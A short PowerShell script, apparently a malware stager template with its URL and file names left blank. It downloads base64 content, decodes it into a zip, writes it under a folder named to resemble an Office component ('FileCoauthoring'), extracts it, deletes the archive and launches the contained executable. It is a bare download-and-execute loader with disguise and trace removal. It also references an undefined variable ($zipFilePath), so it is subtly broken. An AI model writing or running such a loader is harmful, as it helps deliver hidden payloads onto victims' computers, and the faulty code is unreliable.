$url = ""
$zipName = ""
$exeName = ""

$response = Invoke-WebRequest -Uri $url -UseBasicParsing
$base64Content = $response.Content
$bytes = [Convert]::FromBase64String($base64Content)
$directoryPath = "$env:LOCALAPPDATA\FileCoauthoring"
$zipFileName = "$directoryPath\$zipname"
Write-Output $zipFileName
if (-not (Test-Path $directoryPath)) {
    New-Item -ItemType Directory -Path $directoryPath -Force
}

[System.IO.File]::WriteAllBytes($zipFilePath, $bytes)
Expand-Archive -LiteralPath $zipFilePath -DestinationPath $pwd -Force
Remove-Item -Path $zipFilePath
Start-Process -FilePath "$pwd\$exeName"

